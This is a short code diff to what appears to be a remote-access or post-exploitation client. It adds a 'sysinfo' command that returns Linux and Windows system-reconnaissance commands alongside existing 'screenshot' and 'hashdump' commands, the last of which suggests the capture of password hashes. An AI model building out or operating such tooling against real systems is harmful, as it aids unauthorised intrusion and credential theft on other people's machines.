@@ -53,9 +53,17 @@ class Client:
             return "screenshot"
         elif command.lower() == "hashdump":
             return self.hashdump()
+        elif command.lower() == "sysinfo":
+            return self.sysinfo()
         else:
             print("Unknown command. Try 'help' or '?' to display help", end="\n\n")
             return "unknown"
+
+    def sysinfo(self):
+        if self.os_client == "Linux":
+            return "uname -a"
+        elif self.os_client == "Windows":
+            return "wmic computersystem get manufacturer,name,username && wmic os get caption,version"
 
     def hashdump(self):
         if self.os_client == "Linux":
